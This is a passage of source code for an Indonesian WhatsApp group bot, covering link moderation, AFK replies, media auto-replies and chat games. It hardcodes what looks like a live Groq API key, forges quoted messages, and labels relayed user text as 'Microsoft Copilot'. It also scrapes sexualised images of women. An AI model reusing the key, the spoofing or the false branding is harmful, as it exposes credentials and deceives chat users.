                let gclink = (`https://chat.whatsapp.com/` + await Yasam.groupInviteCode(m.chat))
                let isLinkThisGc = new RegExp(gclink, 'i')
                let isgclink = isLinkThisGc.test(m.text)
                if (isgclink) return replygcxeon (`Ehh Maaf Gak Jadi, Link Group Ini Ternyata 😆`)
                if (isAdmins) return replygcxeon (`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (YasamCreator) return replygcxeon (`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                Yasam.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
        if (db.data.chats[m.chat].antilink) {
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (YasamCreator) return m.reply(bvl)
await Yasam.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant 
}
})
/*Yasam.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Yasam.sendMessage(from, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} 
}

        //afk
        let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	     for (let jid of mentionUser) {
            let user = db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            replygcxeon(`Tolong Jangan Tag Dia\nDia AFK ${reason ? 'Dengan alasan ' + reason : 'tanpa alasan'}\nAfk Sejak ${clockString(new Date - afkTime)}`.trim())
}
        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            replygcxeon(`Anda Telah Kembali Dari AFK\nAlasan AFK: ${user.afkReason ? user.afkReason : ''}\nDurasi AFK: ${clockString(new Date - user.afkTime)}`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
        
//total features
const xeonfeature = () =>{
            var mytext = fs.readFileSync("./XeonCheems13.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        
        //download status #ctto
        try {
  const textLower = m.text.toLowerCase();
  if (textLower === 'download' || textLower === 'statusdown' || textLower === 'take' || textLower === 'send') {
    const quotedMessage = m.msg.contextInfo.quotedMessage;
    if (quotedMessage) {
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await Yasam.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        Yasam.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        replygcxeon('*Downloading status...*');
      }
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await Yasam.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        Yasam.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        replygcxeon('*Downloading status...*');
      }
    }
  }
} catch (error) {
  console.error("Error in 'send message' handling:", error);
}

//function didyomen
function getCaseNames() {
  try {
    const data = fs.readFileSync('./XeonCheems13.js', 'utf8');
    const casePattern = /case\s+'([^']+)'/g;
    const matches = data.match(casePattern);

    if (matches) {
      return matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
    } else {
      return [];
    }
  } catch (error) {
    console.error('Terjadi kesalahan:', error);
    throw error; 
  }
}
//SanzMD
if (prefix && command) {
  const caseNames = getCaseNames();
  let noPrefix = m.text.replace(prefix, '').trim();
  let mean = didyoumean(noPrefix, caseNames);
  let sim = similarity(noPrefix, mean);
  let similarityPercentage = parseInt(sim * 100);
//SanzMD
  if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
    const respony = (`_Maaf kak, command yang ayang masukkan salah. Berikut ini command yang mungkin sesuai dengan ayang minta_:\n\n➠  *${prefix + mean}*\n➠  *Kemiripan:* ${similarityPercentage}%`);
    // assuming reply is a function that sends a response
    replygcxeon(respony);
//SanzMD
  }
}    
        //autoreply
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./XeonMedia/audio/${BhosdikaXeon}.mp3`)
Yasam.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}      
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./XeonMedia/sticker/${BhosdikaXeon}.webp`)
Yasam.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: fvrif })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./XeonMedia/image/${BhosdikaXeon}.jpg`)
Yasam.sendMessage(m.chat, { image: imagebuffy }, { quoted: fvrif })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./XeonMedia/video/${BhosdikaXeon}.mp4`)
Yasam.sendMessage(m.chat, { video: videobuffy }, { quoted: fvrif })
}
}

const sendapk = (teks) => {
Yasam.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./XeonMedia/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
Yasam.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./XeonMedia/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
Yasam.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of DocXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./XeonMedia/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}

// Response Addlist
if (m.isGroup && isAlreadyResponList(from, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(from, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
Yasam.sendMessage(from, { text: sendResponList(from, body.toLowerCase(), db_respon_list) }, {
quoted: fvrif
})
} else {
Yasam.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: fvrif
})
} 
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
    userJid: Yasam.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Yasam.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
Yasam.ev.emit('messages.upsert', msg)
} 
//============= [LIST RESPONCE CHECKING START ]================
        if(m.mtype === "interactiveResponseMessage"){
            console.log("interactiveResponseMessage Detected!")   
            let msg = m.message[m.mtype]  || m.msg
            if(msg.nativeFlowResponseMessage  && !m.isBot  ){ 
                let { id } = JSON.parse(msg.nativeFlowResponseMessage.paramsJson) || {}  
                if(id){
                    let emit_msg = { 
                        key : { ...m.key } , // SET RANDOME MESSAGE ID  
                        message:{ extendedTextMessage : { text : id } } ,
                        pushName : m.pushName,
                        messageTimestamp  : m.messageTimestamp || 754785898978
                    }
                    return Yasam.ev.emit("messages.upsert" , { messages : [ emit_msg ] ,  type : "notify"})
                }
            }
        }
//============= [LIST RESPONCE CHECKING END ]================


//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
	if (m.key.fromMe) return
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await replygcxeon(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else replygcxeon('*Wrong Answer!*')
        }
        
        //game
        this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // replygcxeon(`[DEBUG]\n${parseInt(m.text)}`)
            if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                replygcxeon({
                    '-3': 'The game is over',
                    '-2': 'Invalid',
                    '-1': 'Invalid Position',
                    0: 'Invalid Position',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) Yasam.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            Yasam.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }
        
        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    Yasam.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    Yasam.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) Yasam.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) Yasam.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) Yasam.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    Yasam.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    replygcxeon(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) Yasam.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    replygcxeon(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) Yasam.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    Yasam.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //end
if (budy.includes('@6283152094406')) {
  const q = budy.replace('@6283152094406', '').trim();
  if (q) {
try {
const Groq = require("groq-sdk");
const groq = new Groq({ apiKey: "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" });
async function main(teks) {
  const completion = await groq.chat.completions
    .create({
      messages: [
        {
          role: "user",
          content: teks
        },
      ],
      model: "mixtral-8x7b-32768",
    })
    .then((chatCompletion) => {
      m.reply(chatCompletion.choices[0]?.message?.content || "");
    });
}
return main(text);
    } catch (error) {
      m.reply("aku gapapa kok.");
    }
  } else {
    m.reply("apasiii kamu??");
  }
}  
const kicktimePath = './database/kicktime.json'; // isi {}
if (!fs.existsSync(kicktimePath)) fs.writeFileSync(kicktimePath, '{}');
function readKicktimeSessions() {
    try {
        return JSON.parse(fs.readFileSync(kicktimePath));
    } catch (error) {
        console.error('Gagal membaca file kicktime:', error);
        return {};
    }
}
function writeKicktimeSessions(sessions) {
    try {
        fs.writeFileSync(kicktimePath, JSON.stringify(sessions, null, 2));
    } catch (error) {
        console.error('Gagal menulis file kicktime:', error);
    }
}
const activeTimeouts = {};
function parseTime(input) {
let match = input.match(/^(\d+)([smh])$/);
if (!match) return null;
let value = parseInt(match[1]);
let unit = match[2];
switch (unit) {
case 's': return value * 1000;
case 'm': return value * 60 * 1000;
case 'h': return value * 60 * 60 * 1000;
default: return null;
}
}
global.db.miscrosofai = global.db.miscrosofai ? global.db.miscrosofai : {};
let mangtaf = Object.values(global.db.miscrosofai).find(v => !v.status && v.receiver == m.sender);

if (mangtaf && body) {
  const sendDomp = {
    key: {
      participants: "6283152094406@s.whatsapp.net",
      remoteJid: "status@broadcast",
      fromMe: false,
      id: "Halo"
    },
    message: {
      contactMessage: {
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=6283152094406:6283152094406\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
      }
    },
    participant: "6283152094406@s.whatsapp.net"
  };

  let text = `*[ Microsoft Copilot ]*\n\n${body}`;    
  await Yasam.sendMessage(mangtaf.from, { text: text }, { quoted: sendDomp })
    .then(async () => {
   await sleep(1000);
   delete global.db.miscrosofai[mangtaf.id];
   return !0;
  });
}
async function gpt4(txt) {
    try {
        console.log('Sending request to GPT-4 API...');
        const api = await axios.get(`https://hercai.onrender.com/turbo/hercai?question=${encodeURIComponent(txt)}`, {
            headers: {
                "content-type": "application/json",
            },
        });

        if (api && api.data) {
            console.log('Received valid response from GPT-4 API');
            return api.data;
        } else {
            console.error('Error: Invalid response from GPT-4 API');
            return null;
        }
    } catch (e) {
        console.error('Error while fetching GPT-4 API response:', e);
        return null;
    }
}
function readSession() {
  try {
    return JSON.parse(fs.readFileSync('./database/aisesi.json', 'utf8'));
  } catch (error) {
    return {};
  }
}
function writeSession(data) {
  fs.writeFileSync('./database/aisesi.json', JSON.stringify(data, null, 2));
}
//screpnya fb dan ig
const yt1s = {
  dl: async (link) => {
    try {
      const { data } = await axios.post('https://yt1s.io/api/ajaxSearch', 
        new URLSearchParams({ p: 'home', q: link, w: '', lang: 'en' }),
        {
          headers: {
            'User-Agent': 'Postify/1.0.0',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          },
        }
      );
 
      if (data.status !== 'ok') throw new Error('Kagak ada response dari Api nya ');
      const $ = cheerio.load(data.data);
      return $('a.abutton.is-success.is-fullwidth.btn-premium')
        .map((_, el) => ({
          title: $(el).attr('title'),
          url: $(el).attr('href'),
        }))
        .get();
    } catch (error) {
      console.error(error);
      throw error;
    }
  }
};
 const links = [
  "https://videy.co/v?id=drfcj5DI1",
  "https://videy.co/v?id=dtsAo1hl1",
  "https://videy.co/v?id=tyQukhe11",
  "https://videy.co/v?id=yS4itpef1",
  "https://videy.co/v?id=FrEfsf4d1",
  "https://videy.co/v?id=rNsbDYix1",
  "https://videy.co/v?id=F9nMos7O1",
  "https://videy.co/v?id=XRrgrZqJ1",
  "https://videy.co/v?id=cZ9uLjhP1",
  "https://videy.co/v?id=BS3Bgaqx1",
  "https://videy.co/v?id=HlDxED2Q1",
  "https://videy.co/v?id=oqdoL1WB",
  "https://videy.co/v?id=DI9pMdX41",
  "https://videy.co/v?id=QU6nHJK71",
  "https://videy.co/v?id=fCOumEXd",
  "https://videy.co/v?id=hc11Ypob1",
  "https://videy.co/v?id=z21E05vG1",
  "https://videy.co/v?id=JYc7CqTM1",
  "https://videy.co/v?id=g67z3K1t1",
  "https://videy.co/v?id=glMrZ1dJ1",
  "https://videy.co/v?id=63HiM8ap1",
  "https://videy.co/v?id=BPYCWEEl1",
  "https://videy.co/v?id=Hjh1XibQ1",
  "https://videy.co/v?id=fU0E6kls1",
  "https://videy.co/v?id=ZGku9ltc1",
  "https://videy.co/v?id=63XmiKf61",
  "https://videy.co/v?id=Xmm7hW7B1",
  "https://videy.co/v?id=MN53D4IU1",
  "https://videy.co/v?id=uvdvJBNe1",
  "https://videy.co/v?id=V3du3fYN1",
  "https://videy.co/v?id=8zYVoI601",
  "https://videy.co/v?id=BFdWBV7r",
  "https://videy.co/v?id=oDN9BQob",
  "https://videy.co/v?id=vuGY8bMf1",
  "https://videy.co/v?id=3VvPZkAS1",
  "https://videy.co/v?id=ozzum9KK",
  "https://videy.co/v?id=9OnQs3za",
  "https://videy.co/v?id=7VNnq8WI",
  "https://videy.co/v?id=FvkIVFXE1",
  "https://videy.co/v?id=mwMgpziJ1",
  "https://videy.co/v?id=tRBPHWjG1",
  "https://videy.co/v?id=vMiuA1NE1",
  "https://videy.co/v?id=pM3f3gTu1",
  "https://videy.co/v?id=WmfAHZki1",
  "https://videy.co/v?id=9m82uE5c1",
];
//bug siape 
		if (!YasamCreator && !m.key.fromMe && m.message) {
			if (budy.match(`@${ownernumber}`)) {
				await Yasam.sendMessage(m.chat, { 
					text: `👋 Hai kak! Sepertinya kakak lagi butuh bantuan dari *${ownerName}*, ya?\n\nOwner mungkin lagi sibuk nih, tapi tenang aja, nanti bakal dibales secepatnya! ✨ Sabar yaa~ 😊`
				}, {
					quoted: m
				});
			}
		};
	
        //user db
        if (isCommand && !isUser) {
xeonverifieduser.push(sender)
fs.writeFileSync('./src/data/role/user.json', JSON.stringify(xeonverifieduser, null, 2))
}    

        switch (isCommand) {                 	                  
case 'gimage':{
if (!text) return replygcxeon(`Usage: ${prefix}gimage dgxeon github`);
Yasam.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let ini = await fetchJson(`https://aemt.me/googleimage?query=${q}`);
try{
for (let bing of ini.result) {
await sleep(500)
await Yasam.sendMessage(m.chat, { image: { url: bing }, caption: ``}, {quoted: fvrif})
Yasam.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}
} catch (e) {
Yasam.sendMessage(m.chat, { react: { text: `✖️`, key: m.key }})
}
}
break
        case 'delcase': {
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (!text) return replygcxeon('Mana case yang ingin dihapus?');

 // Nama file yang akan dimodifikasi
 const namaFile = './XeonCheems13.js';

 // Case yang ingin Anda hapus
 const caseToDelete = `case '${text}':`;

 // Baca isi file
 fs.readFile(namaFile, 'utf8', (err, data) => {
 if (err) {
 console.error('Terjadi kesalahan saat membaca file:', err);
 return replygcxeon('Terjadi kesalahan saat membaca file.');
 }
const posisiCase = data.indexOf(caseToDelete);
 if (posisiCase === -1) {
 return replygcxeon(`Case '${args}' tidak ditemukan dalam file.`);
 }

 // Cari posisi break; berikutnya setelah case
 const posisiBreak = data.indexOf('break;', posisiCase);
 if (posisiBreak === -1) {
 return replygcxeon('Tidak dapat menemukan "break;" setelah case yang ingin dihapus.');
 }

 // Potong data untuk menghapus case
 const kodeBaruLengkap = data.slice(0, posisiCase) + data.slice(posisiBreak + 'break;'.length);
fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
 if (err) {
 console.error('Terjadi kesalahan saat menulis file:', err);
 return replygcxeon('Terjadi kesalahan saat menulis file.');
 } else {
 return replygcxeon(`Case '${text}' berhasil dihapus.`);
 }
 });
 });
    }
 break;
 
case 'kirimpesan': {
 if (!YasamCreator) return (mess.owner)
 let [number, pesan] = text.split`|`
 if (!number) return replygcxeon(`Salah bajindul, Ga ada nomornya, contohnya gini\n\n${prefix}pesan 62857xxx|pesan mu`);
 if (!pesan) return replygcxeon(`Salah bajindul, Ga ada pesannya, contohnya gini\n\n${prefix}pesan 62857xxx|pesan mu`);
 if (text > 500) return replygcxeon('Panjang bet dah! Emang mau Ngapain sih😤')
 replygcxeon (mess.wait)
 try {
 let user = global.db.data.users[m.sender]
 let korban = `${number}`
 let pengirim = m.sender
 let ngarep = `${pesan}`
 await Yasam.sendMessage(`${korban}@s.whatsapp.net`, {
 text: ngarep
 }, {
 quoted: null
 })
 replygcxeon(mess.done);
 } catch (err) {
 replygcxeon('Penitipan pesan gagal');
 console.log(err)
 }
}
break
case 'cecanjepang': {
await loading ()
 const createImage = async (url) => {
 const { imageMessage } = await generateWAMessageContent({
 image: {
 url
 }
 }, {
 upload: Yasam.waUploadToServer
 });
 return imageMessage;
 };
 async function pinterest(query) {
 let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
 let json = await res.json();
 let data = json.resource_response.data.results;
 if (!data.length) reply(`Query "${query}" not found :/`);
 return data[~~(Math.random() * data.length)].images.orig.url;
 }
 const imageUrls = [];
 for (let i = 0; i < 10; i++) {
 const imageUrl = await pinterest('tobrut hijab');
 imageUrls.push(imageUrl);
 }
 const cards = await Promise.all(imageUrls.map(async (url, index) => ({
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `Image ${index + 1}`,
 hasMediaAttachment: true,
 imageMessage: await createImage(url)
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [] // Hapus semua tombol
 })
 })));
 const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `> Batas 10 photo`
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards
 })
 })
 }
 }
 }, {});

 await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
 });
};
break

case 'cecanindo': {
 const createImage = async (url) => {
 const { imageMessage } = await generateWAMessageContent({
 image: {
 url
 }
 }, {
 upload: Yasam.waUploadToServer
 });
 return imageMessage;
 };
 async function pinterest(query) {
 let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
 let json = await res.json();
 let data = json.resource_response.data.results;
 if (!data.length) reply(`Query "${query}" not found :/`);
 return data[~~(Math.random() * data.length)].images.orig.url;
 }
 const imageUrls = [];
 for (let i = 0; i < 10; i++) {
 const imageUrl = await pinterest('tobrut hijab');
 imageUrls.push(imageUrl);
 }
 const cards = await Promise.all(imageUrls.map(async (url, index) => ({
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `Image ${index + 1}`,
 hasMediaAttachment: true,
 imageMessage: await createImage(url)
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [] // Hapus semua tombol
 })
 })));
 const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `> Batas 10 photo`
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards
 })
 })
 }
 }
 }, {});

 await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
 });
};
break

case 'namajepang': case 'namaninja':{
	if (!q) return replygcxeon (`nama kakak siapa?`)
	let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text;
	replygcxeon (
		teks.replace(/[a-z]/gi, (v) => {
			return (
				{
					a: "ka",
					b: "tu",
					c: "mi",
					d: "te",
					e: "ku",
					f: "lu",
					g: "ji",
					h: "ri",
					i: "ki",
					j: "zu",
					k: "me",
					l: "ta",
					m: "rin",
					n: "to",
					o: "mo",
					p: "no",
					q: "ke",
					r: "shi",
					s: "ari",
					t: "ci",
					u: "do",
					v: "ru",
					w: "mei",
					x: "na",
					y: "fu",
					z: "zi",
				}[v.toLowerCase()] || v
			);
		}),
	);
}
break
case 'sendfitur': {
if (!YasamCreator) return replygcxeon(mess.owner);
if (!m.quoted) return replygcxeon('Kutip pesan seseorang!');
if (!text) return replygcxeon(`Contoh: ${prefix+command} menu`);
const getCase = async (caseName) => {
try {
const fileContent = await fs.promises.readFile("./XeonCheems13.js", "utf-8");
const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
const match = fileContent.match(caseRegex);
if (!match) {
return replygcxeon(`Case '${caseName}' tidak ditemukan.`);
}
return match[0];
} catch (error) {
return replygcxeon(`Terjadi kesalahan saat membaca file: ${error.message}`);
}};
const caseName = text.trim();
getCase(caseName)
.then(caseCode => {
const recipient = m.quoted ? m.quoted.sender : m.mentionedJid[0];
if (!recipient || !recipient.includes('@s.whatsapp.net')) {
return replygcxeon('Format ID WhatsApp tidak valid!');
}
const sendFeature = async (recipient, caseCode) => {
try {
const contact = (await Yasam.onWhatsApp(recipient.split('@')[0]))[0] || {};
if (!contact) return replygcxeon('Kontak tidak ditemukan di WhatsApp.');
const message = `Hi, kamu dapet kiriman fitur nih!\n\n${caseCode}`;
await Yasam.sendMessage(recipient, { text: message }, { quoted: fvrif });
replygcxeon('Fitur berhasil terkirim!');
} catch (error) {
console.error('Terjadi kesalahan:', error.message);
replygcxeon('Terjadi kesalahan saat mengirim fitur: ' + error.message);
}};
sendFeature(recipient, caseCode);
})
.catch(error => replygcxeon(`Terjadi kesalahan: ${error.message}`));
}
break;
case 'storyanime': {
 const fetch = require('node-fetch'); // Pastikan untuk menginstal node-fetch
 const cheerio = require('cheerio'); // Pastikan untuk menginstal cheerio

 m.reply(mess.wait); // Mengirim pesan menunggu

 async function animeVideo() {
 const url = 'https://shortstatusvideos.com/anime-video-status-download/'; // URL untuk mengambil video
 const response = await fetch(url); // Mengambil data dari URL
 const html = await response.text(); // Mengambil HTML dari response
 const $ = cheerio.load(html); // Memuat HTML ke cheerio
 const videos = []; // Array untuk menyimpan video

 // Mengambil semua elemen yang sesuai dengan selector
 $('a.mks_button.mks_button_small.squared').each((index, element) => {
 const href = $(element).attr('href'); // Mengambil link video
 const title = $(element).closest('p').prevAll('p').find('strong').text(); // Mengambil judul video
 videos.push({
 title,
 source: href
 });
 });

 // Memilih video secara acak3
 const randomIndex = Math.floor(Math.random() * videos.length);
 const randomVideo = videos[randomIndex];

 return randomVideo; // Mengembalikan video yang dipilih
 }

 // Memanggil fungsi dan mengirimkan hasilnya
 const video = await animeVideo();
